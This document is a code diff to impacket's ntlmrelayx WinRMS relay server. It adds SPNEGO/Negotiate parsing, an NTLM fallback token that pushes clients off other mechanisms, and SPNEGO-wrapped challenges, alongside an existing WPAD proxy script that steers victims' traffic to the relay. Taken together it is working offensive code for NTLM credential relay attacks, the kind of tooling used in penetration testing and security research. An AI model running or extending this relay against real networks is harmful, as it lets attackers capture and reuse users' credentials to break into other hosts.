@@ -21,7 +21,6 @@ import socketserver
 import socket
 import base64
 import random
-import struct
 import string
 from threading import Thread
 from six import PY2, b
@@ -32,6 +31,13 @@ from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.examples.ntlmrelayx.utils.spnegoutils import (
+    NTLM_MECH,
+    build_ntlm_challenge_token,
+    build_ntlm_fallback_token,
+    get_ntlm_message_type,
+    inspect_spnego_token,
+)
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
 
@@ -89,6 +95,8 @@ class WinRMSRelayServer(Thread):
             self.relayToHost = False
             self.isFirstNeg = True
             self.negotiation_count = 0 
+            self.auth_scheme = 'Negotiate'
+            self.client_uses_spnego = False
             self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
                         '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
                         'return "PROXY %s:80; DIRECT";} '
@@ -167,6 +175,7 @@ class WinRMSRelayServer(Thread):
                 self.wfile.write(imgFile_data)
 
         def strip_blob(self, proxy):
+            token = messageType = None
             if PY2:
                 if proxy:
                     proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
@@ -179,7 +188,7 @@ class WinRMSRelayServer(Thread):
                     autorizationHeader = self.headers.get('Authorization')
 
             if (proxy and proxyAuthHeader is None) or (not proxy and autorizationHeader is None):
-                self.do_AUTHHEAD(message = b'NTLM',proxy=proxy)
+                self.do_AUTHHEAD(message=b'NTLM' if proxy else b'Negotiate', proxy=proxy)
                 messageType = 0
                 token = None
             else:
@@ -188,17 +197,36 @@ class WinRMSRelayServer(Thread):
                 else:
                     typeX = autorizationHeader
                 try:
-                    try:
-                        _, blob = typeX.split('NTLM')
-                    # Not using NTLM but Negotiate
-                    except ValueError:
-                        _, blob = typeX.split('Negotiate')
+                    scheme, blob = typeX.split(None, 1)
+                    if scheme.lower() not in ('ntlm', 'negotiate'):
+                        raise ValueError('Unsupported HTTP authentication scheme %s' % scheme)
+                    self.auth_scheme = scheme
+                    self.client_uses_spnego = False
                     token = base64.b64decode(blob.strip())
+
+                    if scheme.lower() == 'negotiate':
+                        token_info = inspect_spnego_token(token)
+                        self.client_uses_spnego = token_info.is_spnego
+                        if token_info.negoex_offered:
+                            LOG.info("(WinRMS): NEGOEX authentication offered by client %s, currently not supported for relay" % self.client_address[0])
+                        if token_info.negoex_selected:
+                            LOG.info("(WinRMS): NEGOEX selected by client %s, currently not supported for relay" % self.client_address[0])
+                            self.do_AUTHHEAD(message=b'Negotiate', proxy=proxy)
+                            return None, 0
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            fallback = base64.b64encode(build_ntlm_fallback_token())
+                            self.do_AUTHHEAD(message=b'Negotiate ' + fallback, proxy=proxy)
+                            return None, 0
+                        token = token_info.inner_token
+
+                    messageType = get_ntlm_message_type(token)
+                    if messageType is None:
+                        raise ValueError('Authorization token is not NTLM')
                 except Exception:
                     LOG.debug("(WinRMS): Exception:", exc_info=True)
-                    self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
-                else:
-                    messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
+                    self.do_AUTHHEAD(message=b'NTLM' if proxy else b'Negotiate', proxy=proxy)
+                    token = None
+                    messageType = 0
             return token, messageType
 
         def do_HEAD(self):
@@ -339,7 +367,11 @@ class WinRMSRelayServer(Thread):
                 LOG.error('(WinRMS): Protocol Client for %s not found!' % self.target.scheme.upper())
                 return False
 
-            self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
+            challenge = self.challengeMessage.getData()
+            if self.client_uses_spnego:
+                challenge = build_ntlm_challenge_token(challenge)
+            scheme = self.auth_scheme.encode('ascii')
+            self.do_AUTHHEAD(message=scheme + b' ' + base64.b64encode(challenge), proxy=proxy)
             return True
 
         def do_ntlm_auth(self,token,authenticateMessage):
@@ -386,7 +418,11 @@ class WinRMSRelayServer(Thread):
                 challengeMessage['Version'] = b'\xff' * 8
                 challengeMessage['VersionLen'] = 8
 
-                self.do_AUTHHEAD(message=b'Negotiate ' + base64.b64encode(challengeMessage.getData()),proxy=proxy)
+                challenge = challengeMessage.getData()
+                if self.client_uses_spnego:
+                    challenge = build_ntlm_challenge_token(challenge)
+                scheme = self.auth_scheme.encode('ascii')
+                self.do_AUTHHEAD(message=scheme + b' ' + base64.b64encode(challenge), proxy=proxy)
                 return
 
             elif messageType == 3:
